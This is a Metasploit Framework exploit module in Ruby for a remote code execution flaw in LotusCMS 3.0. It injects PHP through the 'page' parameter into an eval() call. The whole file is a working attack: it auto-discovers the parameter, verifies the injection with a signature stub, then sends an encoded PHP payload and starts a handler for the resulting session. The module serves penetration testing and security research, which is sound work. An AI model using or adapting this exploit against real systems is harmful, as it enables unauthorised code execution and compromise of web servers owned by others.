##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanUniqueQuery

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'LotusCMS 3.0 eval() Remote Command Execution',
			'Description'    => %q{
					This module exploits a vulnerability found in Lotus CMS 3.0's Router()
				function.  This is done by embedding PHP code in the 'page' parameter,
				which will be passed to a eval call, therefore allowing remote code execution.

					The module can either automatically pick up a 'page' parameter from the
				default page, or manually specify one in the URI option.  To use the automatic
				method, please supply the URI with just a directory path, for example: "/lcms/".
				To manually configure one, you may do: "/lcms/somepath/index.php?page=index"
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Alligator Security Team',
					'dflah_ <dflah_[at]alligatorteam.org>',
					'sherl0ck_ <sherl0ck_[at]alligatorteam.org>',
					'sinn3r'  #Metasploit-fu
				],
			'References'     =>
				[
					[ 'OSVDB', '75095' ],
					[ 'URL', 'http://secunia.com/secunia_research/2011-21/' ]
				],
			'Payload'        =>
				{
					'Space'       => 4000, # only to prevent error HTTP 414 (Request-URI Too Long)
					'DisableNops' => true,
					'BadChars'    => "#",
					'Keys'        => ['php']
				},
			'Platform'        => [ 'php' ],
			'Arch'            => ARCH_PHP,
			'Targets'         => [[ 'Automatic LotusCMS 3.0', { }]],
			'Privileged'      => false,
			'DisclosureDate'  => 'Mar 3 2011',
			'DefaultTarget'   => 0))

		register_options(
		[
			OptString.new('URI', [true, 'URI', '/']),
			Opt::RPORT(80),
		], self.class)
	end

	def target_url
		uri = datastore['URI']

		# Make sure uri begins with '/'
		if uri[0] != '/'
			uri = '/' + uri
		end

		# Extract two things:
		# 1. The file path (/index.php), including the base
		# 2. GET parameters from the GET query
		uri   = uri.scan(/^(\/.+)\/(\w+\.php)*\?*(\w+=.+&*)*$/).flatten
		base  = (uri[0] || "") + '/'
		fname = uri[1] || ""
		query = uri[2] || ""
		params = queryparse(query) rescue ""

		# Use the user-supplied query if there's one, if not we'll auto-detect
		# by regexing a hyper-link
		if base.empty? or fname.empty? or params.empty?
			res = send_request_cgi({
				'method' => 'GET',
				'uri'    => datastore['URI']
			}, 20)

			if res and res.code == 200
				uri = res.body.scan(/<a.*href=['|"](\/*index\.php)\?.*(page=\w+)['|"].*>/).flatten
				@uri = base + uri[0]
				@arg = uri[1]
				print_status("Using found page param: #{@uri}?#{@arg}")
			else
				@uri = ""
				@arg = ""
			end
		else
			@uri = base + fname
			@arg = "page=#{params['page']}"
		end
	end

	def check
		target_url
		if @uri.empty? or @arg.empty?
			print_error("Unable to get the page parameter, please reconfigure URI")
			return
		end

		signature = rand_text_alpha(rand(10)+10)
		stub = "${print('#{signature}')};"
		sploit = "');#{stub}#"
		response = send_request_cgi(
		{
			'method'  => 'POST',
			'uri' =>  @uri,
			'data' => @arg + Rex::Text.uri_encode(sploit)
		}, 20)

		if response and response.body =~ /#{signature}/
			print_status("Signature: #{signature}")
			return Exploit::CheckCode::Vulnerable
		else
			print_error("Signature was not detected")
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		return if not check == Exploit::CheckCode::Vulnerable

		begin
			sploit = "');#{payload.encoded}#"
			print_status("Sending exploit ...")
			res = send_request_cgi(
			{
				'method'  => 'POST',
				'uri' =>  @uri,
				'data' => @arg + Rex::Text.uri_encode(sploit)
			}, 20)
			handler
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end
